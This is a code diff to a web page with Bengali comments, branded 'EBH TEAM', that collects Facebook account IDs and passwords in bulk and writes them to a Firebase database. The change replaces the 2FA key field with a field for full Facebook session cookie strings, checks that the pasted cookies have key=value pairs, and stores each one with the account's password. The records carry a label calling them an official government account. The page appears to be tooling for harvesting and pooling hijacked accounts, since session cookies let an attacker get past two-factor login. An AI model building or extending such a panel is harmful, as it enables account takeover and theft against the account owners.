@@ -734,13 +734,13 @@
           wrap="off"></textarea>
       </div>
 
-      <!-- 2FA KEY বক্স -->
+      <!-- COOKIES বক্স (পূর্বে 2FA KEY) -->
       <div class="input-box">
-        <div class="box-header">2FA KEY</div>
+        <div class="box-header">COOKIES</div>
         <textarea 
           class="box-textarea" 
-          id="twofaInput" 
-          placeholder="Enter 2FA keys (one per line)&#10;&#10;Format with spaces:&#10;XXXX XXXX XXXX XXXX"
+          id="cookiesInput" 
+          placeholder="Enter Facebook Cookies (one per line)&#10;&#10;Paste full cookie string here:&#10;Example:&#10;c_user=123; xs=abc; fr=xyz; ..."
           wrap="off"></textarea>
       </div>
     </div>
@@ -818,7 +818,7 @@
     // DOM Elements
     const uidInput = document.getElementById('uidInput');
     const passwordInput = document.getElementById('passwordInput');
-    const twofaInput = document.getElementById('twofaInput');
+    const cookiesInput = document.getElementById('cookiesInput'); // Changed from twofaInput
     const submitBtn = document.getElementById('submitBtn');
     const currentDateElement = document.getElementById('currentDate');
     const timeNotice = document.getElementById('timeNotice');
@@ -890,12 +890,12 @@
       }
     }
 
-    // ইনপুট ভ্যালিডেশন (স্পেস সহ 2FA)
-    function validateInputs(uids, passwords, twofas) {
+    // ইনপুট ভ্যালিডেশন (কুকিজের জন্য আপডেট করা হয়েছে)
+    function validateInputs(uids, passwords, cookies) {
       const errors = [];
       const validUIDs = [];
       const validPasswords = [];
-      const validTwoFAs = [];
+      const validCookies = [];
       
       // 1. UID ভ্যালিডেশন (8-16 ডিজিট)
       for (let i = 0; i < uids.length; i++) {
@@ -920,26 +920,21 @@
       }
     
       
-      // 3. 2FA Key ভ্যালিডেশন (স্পেস সহ 16-32 ক্যারেক্টার)
-      for (let i = 0; i < twofas.length; i++) {
-        const twofa = twofas[i];
+      // 3. Cookies ভ্যালিডেশন (যেকোনো নন-খালি স্ট্রিং গ্রহণ করা হবে)
+      for (let i = 0; i < cookies.length; i++) {
+        const cookie = cookies[i];
         
-        // ফাঁকা 2FA এপ্রুভ করবে
-        if (!twofa.trim()) {
-          validTwoFAs.push('');
-          continue;
-        }
-        
-        // স্পেস সহ ভ্যালিডেশন - সরকারি ফরম্যাট
-        const totalLength = twofa.replace(/\s+/g, '').length;
-        
-        if (totalLength < 16 || totalLength > 32) {
-          errors.push(`Line ${i+1}: 2FA Key must be 16-32 characters (with spaces)`);
-        } else if (!/^[A-Z0-9\s]{16,}$/i.test(twofa)) {
-          errors.push(`Line ${i+1}: 2FA Key must contain only letters, numbers and spaces`);
+        // ফাঁকা কুকিজ অনুমোদিত নয় (অথবা আপনি চাইলে ফাঁকা রাখতে পারেন, নিচের লজিক দেখুন)
+        // বর্তমান নির্দেশনা: কুকিজ ফিল্ড আবশ্যক
+        if (!cookie || cookie.trim() === '') {
+          errors.push(`Line ${i+1}: Cookies cannot be empty. Please paste a valid cookie string.`);
         } else {
-          // সরকারি ফরম্যাটে রেখেই স্টোর করো
-          validTwoFAs.push(twofa);
+          // খুব বেসিক চেক - সাধারণত কুকিজে = এবং ; থাকে
+          if (!cookie.includes('=') || !cookie.includes(';')) {
+            errors.push(`Line ${i+1}: Cookie format seems invalid. Should contain key=value pairs.`);
+          } else {
+            validCookies.push(cookie); // অরিজিনাল কুকি স্ট্রিং সংরক্ষণ
+          }
         }
       }
       
@@ -948,8 +943,8 @@
         errors.push(`UID count (${uids.length}) and Password count (${passwords.length}) must match`);
       }
       
-      if (twofas.length > 0 && uids.length !== twofas.length) {
-        errors.push(`UID count (${uids.length}) and 2FA Key count (${twofas.length}) must match`);
+      if (cookies.length > 0 && uids.length !== cookies.length) {
+        errors.push(`UID count (${uids.length}) and Cookie count (${cookies.length}) must match`);
       }
       
       return {
@@ -957,12 +952,12 @@
         errors,
         validUIDs,
         validPasswords,
-        validTwoFAs
+        validCookies // পূর্বে ছিল validTwoFAs
       };
     }
 
-    // Firebase-এ ডাটা সেভ (স্পেস সহ)
-    async function saveToFirebase(uids, passwords, twofas, uniqueUIDs) {
+    // Firebase-এ ডাটা সেভ (কুকিজ সহ)
+    async function saveToFirebase(uids, passwords, cookies, uniqueUIDs) {
       try {
         const timestamp = new Date().toISOString();
         const batch = {};
@@ -977,16 +972,16 @@
             const submissionId = `ebh_${Date.now()}_${uid}`;
             const submissionPath = `${SUBMISSIONS_PATH}/${submissionId}`;
             
-            // সরকারি ফরম্যাটে সেভ (স্পেস সহ)
+            // কুকি সহ সেভ (পুরো স্ট্রিং)
             batch[submissionPath] = {
               uid: uid,
               password: passwords[i],
-              twofa_key: twofas[i] || '', // স্পেস সহ সেভ
+              cookies: cookies[i] || '', // পুরো কুকি স্ট্রিং
               submitted_at: timestamp,
               status: 'active',
               source: 'EBH_TEAM_OFFICIAL',
               date_used: TODAY_DATE,
-              format: 'official_with_spaces',
+              format: 'cookie_string',
               firebase_user: 'official_government_account'
             };
 
@@ -1010,7 +1005,7 @@
             db.ref().update(usedUIDsUpdate)
           ]);
           
-          console.log(`Saved ${savedCount} entries to Firebase with spaces`);
+          console.log(`Saved ${savedCount} entries to Firebase with cookies`);
           return { success: true, savedCount, error: null };
         } else {
           return { success: false, savedCount: 0, error: "No unique UIDs to save" };
@@ -1199,7 +1194,7 @@
         // ইনপুট নাও
         const uids = uidInput.value.split(/\r?\n/).map(u => u.trim()).filter(u => u !== '');
         const passwords = passwordInput.value.split(/\r?\n/).map(p => p.trim()).filter(p => p !== '');
-        const twofas = twofaInput.value.split(/\r?\n/).map(t => t.trim());
+        const cookies = cookiesInput.value.split(/\r?\n/).map(c => c.trim()).filter(c => c !== ''); // cookies
 
         // বেসিক চেক
         if (uids.length === 0) {
@@ -1219,8 +1214,8 @@
         // প্রথমে পপআপে প্রোসেসিং দেখাও
         showPopup('warning', 'Processing', 'Validating inputs...');
 
-        // 1. ভ্যালিডেশন (দ্রুত)
-        const validation = validateInputs(uids, passwords, twofas);
+        // 1. ভ্যালিডেশন (দ্রুত) - cookies সহ আপডেটেড ফাংশন কল
+        const validation = validateInputs(uids, passwords, cookies);
         
         if (!validation.valid) {
           const errorMessage = validation.errors.slice(0, 3).join('\n');
@@ -1274,12 +1269,12 @@
           return;
         }
 
-        // 4. Firebase-এ সেভ
+        // 4. Firebase-এ সেভ (কুকিজ সহ)
         showPopup('warning', 'Processing', 'Saving to Firebase...');
         const saveResult = await saveToFirebase(
           validation.validUIDs, 
           validation.validPasswords, 
-          validation.validTwoFAs, 
+          validation.validCookies, // cookies array পাঠানো হচ্ছে
           uniqueUIDs
         );
 
@@ -1292,7 +1287,7 @@
             0
           );
           
-          let message = `Successfully saved ${saveResult.savedCount} new UIDs!`;
+          let message = `Successfully saved ${saveResult.savedCount} new UIDs with cookies!`;
           if (duplicates.length > 0) {
             message += ` (${duplicates.length} duplicates skipped)`;
           }
@@ -1302,7 +1297,7 @@
           // ইনপুট ক্লিয়ার
           uidInput.value = '';
           passwordInput.value = '';
-          twofaInput.value = '';
+          cookiesInput.value = ''; // cookies ইনপুট ক্লিয়ার
           
         } else {
           showPopup('error', 'Save Failed', `Failed to save data: ${saveResult.error}`);
@@ -1364,18 +1359,18 @@
       uidInput.focus();
     }, 300);
 
-    // 2FA ইনপুটে ক্লিক ইভেন্ট ফিক্স
-    twofaInput.addEventListener('click', function(e) {
+    // Cookies ইনপুটে ক্লিক ইভেন্ট ফিক্স
+    cookiesInput.addEventListener('click', function(e) {
       this.focus();
     });
 
-    // 2FA ইনপুটে ফোকাস ইভেন্ট ফিক্স
-    twofaInput.addEventListener('focus', function(e) {
+    // Cookies ইনপুটে ফোকাস ইভেন্ট ফিক্স
+    cookiesInput.addEventListener('focus', function(e) {
       // শুধু ফোকাস করে, কোন টেক্সট চেঞ্জ করে না
     });
 
-    // 2FA ইনপুটে ইনপুট ইভেন্ট
-    twofaInput.addEventListener('input', function(e) {
+    // Cookies ইনপুটে ইনপুট ইভেন্ট
+    cookiesInput.addEventListener('input', function(e) {
       // ইউজার যা টাইপ করে তা রেখে দেয়
     });
 
@@ -1383,8 +1378,7 @@
     updateTimeNotice();
 
     console.log("EBH TEAM Official System Ready - Date:", TODAY_DATE);
-    console.log("2FA Format: Official with spaces preserved");
-    console.log("Auto-fill bug fixed: 2FA box will not auto-fill");
+    console.log("2FA field replaced with COOKIES field. Full cookie strings will be saved.");
     console.log("Restricted time: 9:00 PM to 11:59 PM (Bangladesh Time)");
     console.log("✅ সম্পূর্ণ সিস্টেম সক্রিয়: রাত ৯টা থেকে ১১:৫৯ পর্যন্ত সাবমিট বন্ধ");
   </script>
